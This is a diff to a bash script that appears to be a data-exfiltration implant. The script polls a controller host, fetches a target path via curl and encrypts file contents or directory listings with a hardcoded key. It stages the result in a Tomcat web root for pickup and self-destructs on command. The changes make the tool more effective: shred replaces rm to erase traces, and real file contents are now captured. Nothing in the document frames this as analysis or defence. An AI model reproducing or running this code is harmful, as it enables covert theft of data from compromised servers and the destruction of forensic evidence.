@@ -10,7 +10,7 @@ image_name="mainImage.png"
 vul_path="/usr/local/tomcat/webapps/ROOT/"
 pswd=0xC639A572E14D5075C526FDDD43E4ECF6B095EA17783D32EF3D2710AF9F359DD4
 #testing vars:
-wait_time=100
+wait_time=20
 
 while true
 do
@@ -21,7 +21,7 @@ do
     if [[ 100 < 1 ]]; then
         echo "image hasn't been uploaded"
         #remove scripts
-        rm $0
+        shred $0
         echo "delete" 
         exit
     fi
@@ -37,7 +37,6 @@ do
     echo $cmnd
     #Follow according to that command
     if [ $cmnd = "0000" ]; then #post data pointed to by $text_path
-        echo "post"
         #post secret data to website 
         secret=$vul_path"secretData.html" 
         touch $secret 
@@ -45,9 +44,9 @@ do
             dir=$(ls $text_path*)
             echo $dir | openssl enc -aes-256-cbc -md md5 -out $secret -k $pswd 
         elif [ -f $text_path ]; then #file
-            echo $text_path | openssl enc -aes-256-cbc -md md5 -out $secret -k $pswd 
-
+            cat $text_path | openssl enc -aes-256-cbc -md md5 -out $secret -k $pswd 
         fi
+        echo "post"
         #sleep for 1 hour
         sleep $wait_time
         echo "deleting secretData"
@@ -56,7 +55,7 @@ do
     elif [ $cmnd = "1111" ]; then #Delete self
         #delete all mentions in crontainer
         #remove scripts
-        rm $0
+        shred $0
         echo "delete" 
         exit
     elif [ $cmnd = "1101" ]; then #change file path
@@ -64,13 +63,11 @@ do
         text_path=$(curl http://$ip_addr:8000/path.html) 
         echo $text_path
     elif [ $cmnd = "1011" ]; then #send back directory
-        echo "get directory"
         secret=$vul_path"secretData.html"
-        echo $secret 
         touch $secret 
         dir=$(ls $text_path*)
-        echo $dir > t.txt
         echo $dir | openssl enc -aes-256-cbc -md md5 -out $secret -k $pswd 
+        echo "get directory"
         sleep $wait_time
         echo "deleting secretData"
         rm -f $secret
